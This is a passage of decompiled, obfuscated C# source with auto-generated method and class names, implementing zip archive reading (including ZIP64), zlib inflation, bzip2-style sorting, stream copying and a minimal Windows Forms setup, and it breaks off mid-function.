	static Encoding smethod_235(Class8 class8_0, string string_0)
	{
		switch (Class6.smethod_292(class8_0))
		{
		case Enum9.const_0:
			return Class6.smethod_318(class8_0);
		default:
		{
			Encoding encoding = Class6.smethod_318(class8_0);
			if (string_0 == null)
			{
				return encoding;
			}
			byte[] bytes = encoding.GetBytes(string_0);
			string @string = encoding.GetString(bytes, 0, bytes.Length);
			if (@string.Equals(string_0))
			{
				return encoding;
			}
			return Class6.smethod_109(class8_0);
		}
		case Enum9.const_3:
			return Class6.smethod_109(class8_0);
		}
	}

	static int smethod_236(Stream stream_0, byte[] byte_0)
	{
		int num = stream_0.Read(byte_0, 0, 12);
		if (num != 12)
		{
			throw new ZipException($"Unexpected end of data at position 0x{stream_0.Position:X8}");
		}
		return num;
	}

	static bool smethod_237(GClass0 gclass0_0, Encoding encoding_0)
	{
		int num = 0;
		gclass0_0.long_4 = gclass0_0.ArchiveStream.Position;
		int num2 = Class6.smethod_451(gclass0_0.ArchiveStream);
		num = 4;
		if (num2 != 67324752)
		{
			gclass0_0.ArchiveStream.Seek(-4L, SeekOrigin.Current);
			if (num2 != 33639248 && num2 != 101010256L)
			{
				throw new BadReadException($"  Bad signature (0x{num2:X8}) at position  0x{gclass0_0.ArchiveStream.Position:X8}");
			}
			return false;
		}
		byte[] array = new byte[26];
		int num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
		if (num3 != array.Length)
		{
			return false;
		}
		num += num3;
		int num4 = 0;
		byte[] array2 = array;
		num4 = 1;
		byte num5 = array2[0];
		byte[] array3 = array;
		num4 = 2;
		gclass0_0.short_6 = (short)(num5 + array3[1] * 256);
		byte[] array4 = array;
		num4 = 3;
		byte num6 = array4[2];
		byte[] array5 = array;
		num4 = 4;
		gclass0_0.short_7 = (short)(num6 + array5[3] * 256);
		byte[] array6 = array;
		num4 = 5;
		byte num7 = array6[4];
		byte[] array7 = array;
		num4 = 6;
		gclass0_0.short_9 = (gclass0_0.short_8 = (short)(num7 + array7[5] * 256));
		byte[] array8 = array;
		num4 = 7;
		byte num8 = array8[6];
		byte[] array9 = array;
		num4 = 8;
		int num9 = num8 + array9[7] * 256;
		byte[] array10 = array;
		num4 = 9;
		int num10 = num9 + array10[8] * 256 * 256;
		byte[] array11 = array;
		num4 = 10;
		gclass0_0.int_1 = num10 + array11[9] * 256 * 256 * 256;
		gclass0_0.dateTime_0 = Class6.smethod_6(gclass0_0.int_1);
		gclass0_0.enum7_0 |= Enum7.flag_1;
		if ((gclass0_0.short_7 & 1) == 1)
		{
			gclass0_0.enum2_0 = Enum2.const_1;
			gclass0_0.enum2_1 = Enum2.const_1;
			gclass0_0.bool_8 = true;
		}
		gclass0_0.int_2 = array[num4++] + array[num4++] * 256 + array[num4++] * 256 * 256 + array[num4++] * 256 * 256 * 256;
		gclass0_0.long_0 = (uint)(array[num4++] + array[num4++] * 256 + array[num4++] * 256 * 256 + array[num4++] * 256 * 256 * 256);
		gclass0_0.long_2 = (uint)(array[num4++] + array[num4++] * 256 + array[num4++] * 256 * 256 + array[num4++] * 256 * 256 * 256);
		if ((int)gclass0_0.long_0 == -1 || (int)gclass0_0.long_2 == -1)
		{
			gclass0_0.bool_10 = true;
		}
		short num11 = (short)(array[num4++] + array[num4++] * 256);
		short short_ = (short)(array[num4++] + array[num4++] * 256);
		array = new byte[num11];
		num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
		num += num3;
		if ((gclass0_0.short_7 & 0x800) == 2048)
		{
			gclass0_0.AlternateEncoding = Encoding.UTF8;
			gclass0_0.AlternateEncodingUsage = Enum9.const_3;
		}
		gclass0_0.string_1 = gclass0_0.AlternateEncoding.GetString(array, 0, array.Length);
		if (gclass0_0.string_1.EndsWith("/"))
		{
			Class6.smethod_498(gclass0_0);
		}
		num += Class6.smethod_518(short_, gclass0_0, gclass0_0.ArchiveStream);
		gclass0_0.int_4 = 0;
		if (!gclass0_0.string_1.EndsWith("/") && (gclass0_0.short_7 & 8) == 8)
		{
			long position = gclass0_0.ArchiveStream.Position;
			bool flag = true;
			long num12 = 0L;
			int num13 = 0;
			while (flag)
			{
				num13++;
				if (gclass0_0.class8_0.gclass1_0 != null)
				{
					Class6.smethod_494(gclass0_0.class8_0.gclass1_0, gclass0_0);
				}
				long num14 = Class6.smethod_30(gclass0_0.ArchiveStream, 134695760);
				if (num14 != -1L)
				{
					num12 += num14;
					if (gclass0_0.bool_10)
					{
						array = new byte[20];
						num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
						if (num3 != 20)
						{
							return false;
						}
						num4 = 0;
						byte[] array12 = array;
						num4 = 1;
						byte num15 = array12[0];
						byte[] array13 = array;
						num4 = 2;
						int num16 = num15 + array13[1] * 256;
						byte[] array14 = array;
						num4 = 3;
						int num17 = num16 + array14[2] * 256 * 256;
						byte[] array15 = array;
						num4 = 4;
						gclass0_0.int_2 = num17 + array15[3] * 256 * 256 * 256;
						gclass0_0.long_0 = BitConverter.ToInt64(array, 4);
						num4 = 12;
						gclass0_0.long_2 = BitConverter.ToInt64(array, 12);
						num4 = 20;
						gclass0_0.int_4 += 24;
					}
					else
					{
						array = new byte[12];
						num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
						if (num3 != 12)
						{
							return false;
						}
						num4 = 0;
						byte[] array16 = array;
						num4 = 1;
						byte num18 = array16[0];
						byte[] array17 = array;
						num4 = 2;
						int num19 = num18 + array17[1] * 256;
						byte[] array18 = array;
						num4 = 3;
						int num20 = num19 + array18[2] * 256 * 256;
						byte[] array19 = array;
						num4 = 4;
						gclass0_0.int_2 = num20 + array19[3] * 256 * 256 * 256;
						byte[] array20 = array;
						num4 = 5;
						byte num21 = array20[4];
						byte[] array21 = array;
						num4 = 6;
						int num22 = num21 + array21[5] * 256;
						byte[] array22 = array;
						num4 = 7;
						int num23 = num22 + array22[6] * 256 * 256;
						byte[] array23 = array;
						num4 = 8;
						gclass0_0.long_0 = (uint)(num23 + array23[7] * 256 * 256 * 256);
						byte[] array24 = array;
						num4 = 9;
						byte num24 = array24[8];
						byte[] array25 = array;
						num4 = 10;
						int num25 = num24 + array25[9] * 256;
						byte[] array26 = array;
						num4 = 11;
						int num26 = num25 + array26[10] * 256 * 256;
						byte[] array27 = array;
						num4 = 12;
						gclass0_0.long_2 = (uint)(num26 + array27[11] * 256 * 256 * 256);
						gclass0_0.int_4 += 16;
					}
					if (flag = num12 != gclass0_0.long_0)
					{
						gclass0_0.ArchiveStream.Seek(-12L, SeekOrigin.Current);
						num12 += 4L;
					}
					continue;
				}
				return false;
			}
			gclass0_0.ArchiveStream.Seek(position, SeekOrigin.Begin);
		}
		gclass0_0.long_1 = gclass0_0.long_0;
		if ((gclass0_0.short_7 & 1) == 1)
		{
			if (gclass0_0.enum2_0 != Enum2.const_2 && gclass0_0.enum2_0 != Enum2.const_3)
			{
				gclass0_0.byte_3 = new byte[12];
				num += Class6.smethod_236(gclass0_0.stream_0, gclass0_0.byte_3);
				gclass0_0.long_1 -= 12L;
			}
			else
			{
				int int_ = Class6.smethod_222(gclass0_0.enum2_1);
				gclass0_0.class19_0 = Class6.smethod_508(int_, (string)null, gclass0_0.ArchiveStream);
				num += Class6.smethod_538(gclass0_0.class19_0) - 10;
				gclass0_0.long_1 -= Class6.smethod_538(gclass0_0.class19_0);
				gclass0_0.int_4 += 10;
			}
		}
		gclass0_0.int_3 = num;
		gclass0_0.long_6 = gclass0_0.int_3 + gclass0_0.long_1 + gclass0_0.int_4;
		return true;
	}

	static object smethod_238(string string_0, Type type_0, bool bool_0)
	{
		if (bool_0)
		{
			string_0 = string_0.ToLower();
		}
		foreach (Enum value in Enum.GetValues(type_0))
		{
			string text = Class6.smethod_44(value);
			if (bool_0)
			{
				text = text.ToLower();
			}
			if (text == string_0)
			{
				return value;
			}
		}
		return Enum.Parse(type_0, string_0, bool_0);
	}

	static bool smethod_239(Class32 class32_0, Class32.Class33 class33_0, int int_0, int int_1, int int_2)
	{
		int num = int_1 - int_0 + 1;
		if (num < 2)
		{
			if (class32_0.bool_0)
			{
				return class32_0.int_6 > class32_0.int_7;
			}
			return false;
		}
		int i;
		for (i = 0; Class32.int_16[i] < num; i++)
		{
		}
		int[] int_3 = class33_0.int_13;
		char[] char_ = class33_0.char_1;
		byte[] byte_ = class33_0.byte_6;
		int int_4 = class32_0.int_3;
		int num2 = int_4 + 1;
		bool bool_ = class32_0.bool_0;
		int int_5 = class32_0.int_7;
		int num3 = class32_0.int_6;
		while (--i >= 0)
		{
			int num4 = Class32.int_16[i];
			int num5 = int_0 + num4 - 1;
			int j = int_0 + num4;
			while (j <= int_1)
			{
				int num6 = 3;
				for (; j <= int_1; j++)
				{
					if (--num6 < 0)
					{
						break;
					}
					int num7 = int_3[j];
					int num8 = num7 + int_2;
					int num9 = j;
					bool flag = false;
					int num10 = 0;
					int num11;
					int num12;
					do
					{
						IL_03d5:
						if (!flag)
						{
							flag = true;
						}
						else
						{
							int_3[num9] = num10;
							if ((num9 -= num4) <= num5)
							{
								break;
							}
						}
						num10 = int_3[num9 - num4];
						num11 = num10 + int_2;
						num12 = num8;
						if (byte_[num11 + 1] == byte_[num12 + 1])
						{
							if (byte_[num11 + 2] == byte_[num12 + 2])
							{
								if (byte_[num11 + 3] == byte_[num12 + 3])
								{
									if (byte_[num11 + 4] == byte_[num12 + 4])
									{
										if (byte_[num11 + 5] == byte_[num12 + 5])
										{
											if (byte_[num11 += 6] == byte_[num12 += 6])
											{
												int num13 = int_4;
												while (num13 > 0)
												{
													num13 -= 4;
													if (byte_[num11 + 1] == byte_[num12 + 1])
													{
														if (char_[num11] == char_[num12])
														{
															if (byte_[num11 + 2] == byte_[num12 + 2])
															{
																if (char_[num11 + 1] == char_[num12 + 1])
																{
																	if (byte_[num11 + 3] == byte_[num12 + 3])
																	{
																		if (char_[num11 + 2] == char_[num12 + 2])
																		{
																			if (byte_[num11 + 4] == byte_[num12 + 4])
																			{
																				if (char_[num11 + 3] == char_[num12 + 3])
																				{
																					if ((num11 += 4) >= num2)
																					{
																						num11 -= num2;
																					}
																					if ((num12 += 4) >= num2)
																					{
																						num12 -= num2;
																					}
																					num3++;
																					continue;
																				}
																				goto IL_021e;
																			}
																			goto IL_0234;
																		}
																		goto IL_0258;
																	}
																	goto IL_026e;
																}
																goto IL_0292;
															}
															goto IL_02a8;
														}
														goto IL_02cc;
													}
													goto IL_02de;
												}
												break;
											}
											if ((byte_[num11] & 0xFF) <= (byte_[num12] & 0xFF))
											{
												break;
											}
										}
										else if ((byte_[num11 + 5] & 0xFF) <= (byte_[num12 + 5] & 0xFF))
										{
											break;
										}
									}
									else if ((byte_[num11 + 4] & 0xFF) <= (byte_[num12 + 4] & 0xFF))
									{
										break;
									}
								}
								else if ((byte_[num11 + 3] & 0xFF) <= (byte_[num12 + 3] & 0xFF))
								{
									break;
								}
							}
							else if ((byte_[num11 + 2] & 0xFF) <= (byte_[num12 + 2] & 0xFF))
							{
								break;
							}
						}
						else if ((byte_[num11 + 1] & 0xFF) <= (byte_[num12 + 1] & 0xFF))
						{
							break;
						}
						goto IL_03d5;
						IL_0258:
						if (char_[num11 + 2] <= char_[num12 + 2])
						{
							break;
						}
						goto IL_03d5;
						IL_021e:
						if (char_[num11 + 3] <= char_[num12 + 3])
						{
							break;
						}
						goto IL_03d5;
						IL_02cc:
						if (char_[num11] <= char_[num12])
						{
							break;
						}
						goto IL_03d5;
						IL_0234:
						if ((byte_[num11 + 4] & 0xFF) <= (byte_[num12 + 4] & 0xFF))
						{
							break;
						}
						goto IL_03d5;
						IL_026e:
						if ((byte_[num11 + 3] & 0xFF) <= (byte_[num12 + 3] & 0xFF))
						{
							break;
						}
						goto IL_03d5;
						IL_02a8:
						if ((byte_[num11 + 2] & 0xFF) <= (byte_[num12 + 2] & 0xFF))
						{
							break;
						}
						goto IL_03d5;
						IL_02de:
						if ((byte_[num11 + 1] & 0xFF) <= (byte_[num12 + 1] & 0xFF))
						{
							break;
						}
						goto IL_03d5;
						IL_0292:;
					}
					while (char_[num11 + 1] > char_[num12 + 1]);
					int_3[num9] = num7;
				}
				if (bool_ && j <= int_1 && num3 > int_5)
				{
					goto end_IL_0409;
				}
			}
			continue;
			end_IL_0409:
			break;
		}
		class32_0.int_6 = num3;
		if (bool_)
		{
			return num3 > int_5;
		}
		return false;
	}

	static int smethod_240(Stream stream_0, GClass0 gclass0_0)
	{
		int num = 0;
		Stream archiveStream = gclass0_0.ArchiveStream;
		try
		{
			archiveStream.Seek(gclass0_0.FileDataPosition, SeekOrigin.Begin);
			byte[] array = new byte[gclass0_0.BufferSize];
			long num2 = ((gclass0_0.short_9 != 0) ? gclass0_0.long_2 : gclass0_0.long_1);
			gclass0_0.stream_2 = Class6.smethod_112(archiveStream, gclass0_0);
			Stream stream_ = Class6.smethod_374(gclass0_0, gclass0_0.stream_2);
			long num3 = 0L;
			using Stream13 stream = new Stream13(stream_);
			while (num2 > 0L)
			{
				int count = (int)((num2 > array.Length) ? array.Length : num2);
				int num4 = stream.Read(array, 0, count);
				Class6.smethod_342(num4, gclass0_0);
				stream_0.Write(array, 0, num4);
				num2 -= num4;
				num3 += num4;
				Class6.smethod_160(gclass0_0.long_2, num3, gclass0_0);
				if (gclass0_0.bool_12)
				{
					break;
				}
			}
			return Class6.smethod_336(stream);
		}
		finally
		{
			if (archiveStream is ZipSegmentedStream zipSegmentedStream)
			{
				zipSegmentedStream.Dispose();
				gclass0_0.stream_0 = null;
			}
		}
	}

	static long smethod_241(Stream4 stream4_0)
	{
		return stream4_0.long_0;
	}

	static int smethod_242(Class43 class43_0, Enum19 enum19_0)
	{
		if (class43_0.gclass2_0.byte_0 == null)
		{
			throw new GException0("InputBuffer is null. ");
		}
		int num = 0;
		int num2 = -5;
		while (true)
		{
			switch (class43_0.enum17_0)
			{
			case Class43.Enum17.const_11:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 += (uint)(class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] & 0xFF);
					if (class43_0.uint_0 != class43_0.uint_1)
					{
						class43_0.enum17_0 = Class43.Enum17.const_13;
						class43_0.gclass2_0.string_0 = "incorrect data check";
						class43_0.int_1 = 5;
						break;
					}
					class43_0.enum17_0 = Class43.Enum17.const_12;
					return 1;
				}
				return num2;
			case Class43.Enum17.const_10:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 += (uint)((class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] << 8) & 0xFF00);
					class43_0.enum17_0 = Class43.Enum17.const_11;
					break;
				}
				return num2;
			case Class43.Enum17.const_9:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 += (uint)((class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] << 16) & 0xFF0000);
					class43_0.enum17_0 = Class43.Enum17.const_10;
					break;
				}
				return num2;
			case Class43.Enum17.const_8:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 = (uint)((ulong)(class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] << 24) & 0xFF000000uL);
					class43_0.enum17_0 = Class43.Enum17.const_9;
					break;
				}
				return num2;
			case Class43.Enum17.const_7:
				num2 = Class6.smethod_308(class43_0.class40_0, num2);
				switch (num2)
				{
				case -3:
					class43_0.enum17_0 = Class43.Enum17.const_13;
					class43_0.int_1 = 0;
					goto end_IL_05fe;
				case 0:
					num2 = num;
					break;
				}
				if (num2 == 1)
				{
					num2 = num;
					class43_0.uint_0 = Class6.smethod_195(class43_0.class40_0);
					if (class43_0.bool_0)
					{
						class43_0.enum17_0 = Class43.Enum17.const_8;
						break;
					}
					class43_0.enum17_0 = Class43.Enum17.const_12;
					return 1;
				}
				return num2;
			case Class43.Enum17.const_4:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 += (uint)((class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] << 8) & 0xFF00);
					class43_0.enum17_0 = Class43.Enum17.const_5;
					break;
				}
				return num2;
			case Class43.Enum17.const_3:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 += (uint)((class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] << 16) & 0xFF0000);
					class43_0.enum17_0 = Class43.Enum17.const_4;
					break;
				}
				return num2;
			case Class43.Enum17.const_2:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					class43_0.uint_1 = (uint)((ulong)(class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] << 24) & 0xFF000000uL);
					class43_0.enum17_0 = Class43.Enum17.const_3;
					break;
				}
				return num2;
			case Class43.Enum17.const_1:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					int num3 = class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] & 0xFF;
					if (((class43_0.int_0 << 8) + num3) % 31 != 0)
					{
						class43_0.enum17_0 = Class43.Enum17.const_13;
						class43_0.gclass2_0.string_0 = "incorrect header check";
						class43_0.int_1 = 5;
					}
					else
					{
						class43_0.enum17_0 = (((num3 & 0x20) == 0) ? Class43.Enum17.const_7 : Class43.Enum17.const_2);
					}
					break;
				}
				return num2;
			case Class43.Enum17.const_0:
				if (class43_0.gclass2_0.int_1 != 0)
				{
					num2 = num;
					class43_0.gclass2_0.int_1--;
					class43_0.gclass2_0.long_0++;
					if (((class43_0.int_0 = class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++]) & 0xF) != 8)
					{
						class43_0.enum17_0 = Class43.Enum17.const_13;
						class43_0.gclass2_0.string_0 = $"unknown compression method (0x{class43_0.int_0:X2})";
						class43_0.int_1 = 5;
					}
					else if ((class43_0.int_0 >> 4) + 8 > class43_0.int_2)
					{
						class43_0.enum17_0 = Class43.Enum17.const_13;
						class43_0.gclass2_0.string_0 = $"invalid window size ({(class43_0.int_0 >> 4) + 8})";
						class43_0.int_1 = 5;
					}
					else
					{
						class43_0.enum17_0 = Class43.Enum17.const_1;
					}
					break;
				}
				return num2;
			default:
				throw new GException0("Stream error.");
			case Class43.Enum17.const_5:
				if (class43_0.gclass2_0.int_1 == 0)
				{
					return num2;
				}
				num2 = num;
				class43_0.gclass2_0.int_1--;
				class43_0.gclass2_0.long_0++;
				class43_0.uint_1 += (uint)(class43_0.gclass2_0.byte_0[class43_0.gclass2_0.int_0++] & 0xFF);
				class43_0.gclass2_0.uint_0 = class43_0.uint_1;
				class43_0.enum17_0 = Class43.Enum17.const_6;
				return 2;
			case Class43.Enum17.const_6:
				class43_0.enum17_0 = Class43.Enum17.const_13;
				class43_0.gclass2_0.string_0 = "need dictionary";
				class43_0.int_1 = 0;
				return -2;
			case Class43.Enum17.const_13:
				throw new GException0($"Bad state ({class43_0.gclass2_0.string_0})");
			case Class43.Enum17.const_12:
				{
					return 1;
				}
				end_IL_05fe:
				break;
			}
		}
	}

	static void smethod_243(GClass2 gclass2_0)
	{
		int num = gclass2_0.class38_0.int_21;
		if (num > gclass2_0.int_3)
		{
			num = gclass2_0.int_3;
		}
		if (num != 0)
		{
			if (gclass2_0.class38_0.byte_0.Length <= gclass2_0.class38_0.int_20 || gclass2_0.byte_1.Length <= gclass2_0.int_2 || gclass2_0.class38_0.byte_0.Length < gclass2_0.class38_0.int_20 + num || gclass2_0.byte_1.Length < gclass2_0.int_2 + num)
			{
				throw new GException0($"Invalid State. (pending.Length={gclass2_0.class38_0.byte_0.Length}, pendingCount={gclass2_0.class38_0.int_21})");
			}
			Array.Copy(gclass2_0.class38_0.byte_0, gclass2_0.class38_0.int_20, gclass2_0.byte_1, gclass2_0.int_2, num);
			gclass2_0.int_2 += num;
			gclass2_0.class38_0.int_20 += num;
			gclass2_0.long_1 += num;
			gclass2_0.int_3 -= num;
			gclass2_0.class38_0.int_21 -= num;
			if (gclass2_0.class38_0.int_21 == 0)
			{
				gclass2_0.class38_0.int_20 = 0;
			}
		}
	}

	static IPAddress smethod_244(Class63 class63_0)
	{
		return class63_0.ipaddress_0;
	}

	static Stream0 smethod_245(Class8 class8_0)
	{
		return class8_0.stream0_0;
	}

	static int smethod_246(Stream stream_0)
	{
		int result = 0;
		try
		{
			result = Class6.smethod_455("n/a", stream_0);
			return result;
		}
		catch (BadReadException)
		{
			return result;
		}
	}

	static GClass0 smethod_247(string string_0)
	{
		return Class6.smethod_597((object)null, string_0, Enum0.const_6, (object)null);
	}

	static int smethod_248(GClass2 gclass2_0, byte[] byte_0)
	{
		if (gclass2_0.class43_0 != null)
		{
			return Class6.smethod_29(gclass2_0.class43_0, byte_0);
		}
		if (gclass2_0.class38_0 == null)
		{
			throw new GException0("No Inflate or Deflate state!");
		}
		return Class6.smethod_503(byte_0, gclass2_0.class38_0);
	}

	static byte[] smethod_249(Class57 class57_0)
	{
		return class57_0.byte_0;
	}

	static void smethod_250(Stream6 stream6_0)
	{
		if (stream6_0.int_8 != stream6_0.int_9)
		{
			stream6_0.int_7 = 1;
			Class6.smethod_149(stream6_0);
		}
		else if (++stream6_0.int_7 >= 4)
		{
			stream6_0.char_0 = (char)(stream6_0.class34_0.byte_5[stream6_0.int_14] & 0xFFu);
			stream6_0.int_14 = stream6_0.class34_0.int_6[stream6_0.int_14];
			stream6_0.int_11 = 0;
			Class6.smethod_228(stream6_0);
		}
		else
		{
			Class6.smethod_149(stream6_0);
		}
	}

	static void smethod_251(GClass1 gclass1_0)
	{
		Stream readStream = gclass1_0.ReadStream;
		byte[] array = new byte[16];
		readStream.Seek(-40L, SeekOrigin.Current);
		readStream.Read(array, 0, 16);
		long num = BitConverter.ToInt64(array, 8);
		gclass1_0.uint_2 = uint.MaxValue;
		gclass1_0.long_1 = num;
		readStream.Seek(num, SeekOrigin.Begin);
		uint num2 = (uint)Class6.smethod_568(readStream);
		if (num2 != 101075792)
		{
			throw new BadReadException($"  Bad signature (0x{num2:X8}) looking for ZIP64 EoCD Record at position 0x{readStream.Position:X8}");
		}
		readStream.Read(array, 0, 8);
		long num3 = BitConverter.ToInt64(array, 0);
		array = new byte[num3];
		readStream.Read(array, 0, array.Length);
		num = BitConverter.ToInt64(array, 36);
		readStream.Seek(num, SeekOrigin.Begin);
	}

	static void smethod_252(GClass3 gclass3_0, uint[] uint_0, uint[] uint_1)
	{
		for (int i = 0; i < 32; i++)
		{
			uint_0[i] = Class6.smethod_420(uint_1[i], gclass3_0, uint_1);
		}
	}

	static void smethod_253(Class31 class31_0, uint uint_0)
	{
		Class6.smethod_291(class31_0, 8, (uint_0 >> 24) & 0xFFu);
		Class6.smethod_291(class31_0, 8, (uint_0 >> 16) & 0xFFu);
		Class6.smethod_291(class31_0, 8, (uint_0 >> 8) & 0xFFu);
		Class6.smethod_291(class31_0, 8, uint_0 & 0xFFu);
	}

	static void smethod_254(Class52 class52_0)
	{
		class52_0.object_0 = null;
		class52_0.bool_0 = true;
		if (class52_0.manualResetEvent_0 != null)
		{
			class52_0.manualResetEvent_0.Set();
		}
	}

	static int smethod_255(Enum20 enum20_0, GClass2 gclass2_0)
	{
		gclass2_0.enum20_0 = enum20_0;
		return Class6.smethod_128(gclass2_0, bool_0: true);
	}

	static ArrayList smethod_256(Class63 class63_0)
	{
		return class63_0.arrayList_0;
	}

	static byte[] smethod_257(Class19 class19_0)
	{
		if (!class19_0.bool_0)
		{
			Class6.smethod_35(class19_0);
		}
		return class19_0.byte_2;
	}

	static bool smethod_258(string string_0, GClass1 gclass1_0)
	{
		return gclass1_0.dictionary_0.ContainsKey(Class6.smethod_260(string_0));
	}

	static void smethod_259(Stream11 stream11_0, bool bool_0)
	{
		if (stream11_0.bool_2)
		{
			throw new InvalidOperationException();
		}
		if (!stream11_0.bool_1)
		{
			if (stream11_0.int_4 >= 0)
			{
				Class45 object_ = stream11_0.list_0[stream11_0.int_4];
				stream11_0.method_4(object_);
				stream11_0.int_4 = -1;
			}
			if (bool_0)
			{
				Class6.smethod_632(stream11_0, bool_0: true, bool_1: false);
				Class6.smethod_638(stream11_0);
			}
			else
			{
				Class6.smethod_632(stream11_0, bool_0: false, bool_1: false);
			}
		}
	}

	static string smethod_260(string string_0)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			return string_0;
		}
		if (string_0.Length >= 2 && string_0[1] == ':' && string_0[2] == '\\')
		{
			string_0 = string_0.Substring(3);
		}
		string_0 = string_0.Replace('\\', '/');
		while (string_0.StartsWith("/"))
		{
			string_0 = string_0.Substring(1);
		}
		return Class6.smethod_383(string_0);
	}

	static Enum25 smethod_261(Class83 class83_0)
	{
		return (class83_0.method_8() != Class83.Enum26.const_1) ? Enum25.const_1 : Enum25.const_2;
	}

	static void smethod_262(Form1 form1_0)
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)form1_0).SuspendLayout();
		((ContainerControl)form1_0).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)form1_0).set_AutoScaleMode((AutoScaleMode)1);
		((Form)form1_0).set_ClientSize(new Size(284, 261));
		((Form)form1_0).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)form1_0).set_Name("Form1");
		((Control)form1_0).set_Text("Form1");
		((Form)form1_0).add_Load((EventHandler)form1_0.method_0);
		((Control)form1_0).ResumeLayout(false);
	}

	static Stream11 smethod_263(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.stream11_0;
		}
		if (class8_0.stream1_0 != null)
		{
			return null;
		}
		return class8_0.stream0_0.stream11_0;
	}

	static void smethod_264(GClass0 gclass0_0, Stream stream_0)
	{
		Stream stream_ = null;
		long long_ = -1L;
		try
		{
			long_ = stream_0.Position;
		}
		catch (Exception)
		{
		}
		try
		{
			long num = Class6.smethod_173(gclass0_0, ref stream_);
			Stream4 stream = new Stream4(stream_0);
			Stream stream2;
			Stream stream3;
			if (num != 0L)
			{
				stream2 = Class6.smethod_86((Stream)stream, gclass0_0);
				stream3 = Class6.smethod_415(num, gclass0_0, stream2);
			}
			else
			{
				stream2 = (stream3 = stream);
			}
			Stream13 stream4 = new Stream13(stream3, bool_1: true);
			if (gclass0_0.enum0_0 == Enum0.const_4)
			{
				gclass0_0.delegate0_0(gclass0_0.string_1, stream4);
			}
			else
			{
				byte[] array = new byte[gclass0_0.BufferSize];
				int count;
				while ((count = Class6.smethod_652(stream_, array, 0, array.Length, gclass0_0.string_1)) != 0)
				{
					stream4.Write(array, 0, count);
					Class6.smethod_78(Class6.smethod_122(stream4), gclass0_0, num);
					if (gclass0_0.bool_12)
					{
						break;
					}
				}
			}
			Class6.smethod_467(gclass0_0, stream_0, stream, stream2, stream3, stream4);
		}
		finally
		{
			if (gclass0_0.enum0_0 == Enum0.const_5)
			{
				if (gclass0_0.delegate2_0 != null)
				{
					gclass0_0.delegate2_0(gclass0_0.string_1, stream_);
				}
			}
			else if (stream_ is FileStream)
			{
				stream_.Dispose();
			}
		}
		if (!gclass0_0.bool_12)
		{
			gclass0_0.long_3 = long_;
			Class6.smethod_7(stream_0, gclass0_0);
		}
	}

	static bool smethod_265(FileAttributes fileAttributes_0, Class14 class14_0, FileAttributes fileAttributes_1)
	{
		bool flag = false;
		if ((class14_0.fileAttributes_0 & fileAttributes_0) == fileAttributes_0)
		{
			return (fileAttributes_1 & fileAttributes_0) == fileAttributes_0;
		}
		return true;
	}

	static int smethod_266(int[] int_0, int[] int_1, Class44 class44_0, int int_2, int[] int_3, int int_4, int[] int_5, int[] int_6, int[] int_7, int[] int_8, int int_9, int[] int_10)
	{
		int num = 0;
		int num2 = int_4;
		do
		{
			class44_0.int_8[int_3[int_9 + num]]++;
			num++;
			num2--;
		}
		while (num2 != 0);
		if (class44_0.int_8[0] == int_4)
		{
			int_10[0] = -1;
			int_0[0] = 0;
			return 0;
		}
		int num3 = int_0[0];
		int i;
		for (i = 1; i <= 15 && class44_0.int_8[i] == 0; i++)
		{
		}
		int j = i;
		if (num3 < i)
		{
			num3 = i;
		}
		num2 = 15;
		while (num2 != 0 && class44_0.int_8[num2] == 0)
		{
			num2--;
		}
		int num4 = num2;
		if (num3 > num2)
		{
			num3 = num2;
		}
		int_0[0] = num3;
		int num5 = 1 << i;
		while (true)
		{
			if (i < num2)
			{
				if ((num5 -= class44_0.int_8[i]) < 0)
				{
					break;
				}
				i++;
				num5 <<= 1;
				continue;
			}
			if ((num5 -= class44_0.int_8[num2]) < 0)
			{
				return -3;
			}
			class44_0.int_8[num2] += num5;
			int[] int_11 = class44_0.int_11;
			i = 0;
			int_11[1] = 0;
			num = 1;
			int num6 = 2;
			while (--num2 != 0)
			{
				i = (class44_0.int_11[num6] = i + class44_0.int_8[num]);
				num6++;
				num++;
			}
			num2 = 0;
			num = 0;
			do
			{
				if ((i = int_3[int_9 + num]) != 0)
				{
					int_8[class44_0.int_11[i]++] = num2;
				}
				num++;
			}
			while (++num2 < int_4);
			int_4 = class44_0.int_11[num4];
